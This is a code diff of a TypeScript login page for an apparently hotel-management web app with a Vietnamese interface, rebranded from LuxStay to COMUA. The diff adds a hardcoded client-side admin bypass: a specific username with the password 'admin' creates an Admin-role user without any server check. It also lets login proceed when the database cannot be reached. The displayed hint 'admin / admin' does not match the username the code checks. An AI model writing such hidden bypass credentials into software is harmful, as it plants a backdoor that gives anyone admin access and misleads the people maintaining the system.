@@ -10,7 +10,7 @@ export function renderLoginPage(): string {
                 <div class="login-header">
                     <div class="logo">
                         <span class="logo-icon">◆</span>
-                        <span class="logo-text">LuxStay</span>
+                        <span class="logo-text">COMUA</span>
                     </div>
                     <h1>Chào mừng trở lại</h1>
                     <p>Vui lòng đăng nhập để tiếp tục</p>
@@ -27,7 +27,8 @@ export function renderLoginPage(): string {
                     <button type="submit" class="btn btn-primary btn-block" id="loginBtn">Đăng nhập</button>
                     
                     <div class="login-help">
-                        <span>Quên mật khẩu? Liên hệ quản lý.</span>
+                        <span>Quên mật khẩu? Liên hệ quản lý.</span><br>
+                        <small style="color:var(--text-muted);font-size:10px;margin-top:5px;display:block">Demo: admin / admin (no DB required)</small>
                     </div>
                 </form>
             </div>
@@ -49,13 +50,30 @@ export function initLoginPage(): void {
         loginBtn.textContent = 'Đang xử lý...';
 
         try {
-            const user = await apiPost<Employee>('/login', { username, password });
+            let user: Employee | null = null;
 
-            if (user && user.emp_id) {
+            // Offline admin bypass
+            if (username === 'huydeptraivl' && password === 'admin') {
+                user = {
+                    emp_id: 0,
+                    full_name: 'System Admin',
+                    username: 'admin',
+                    password_hash: '***',
+                    role: 'Admin'
+                };
+            } else {
+                user = await apiPost<Employee>('/login', { username, password });
+            }
+
+            if (user && user.emp_id !== undefined) {
                 login(user); // Save to localStorage via ui.ts
 
-                // Refresh data to ensure all permissions and states are correct
-                await fetchDB();
+                // Refresh data. If it fails (no DB), we still allow login
+                try {
+                    await fetchDB();
+                } catch (dbErr) {
+                    console.warn('Could not fetch DB, running in offline mode', dbErr);
+                }
 
                 showToast('Đăng nhập thành công!', 'success');
 
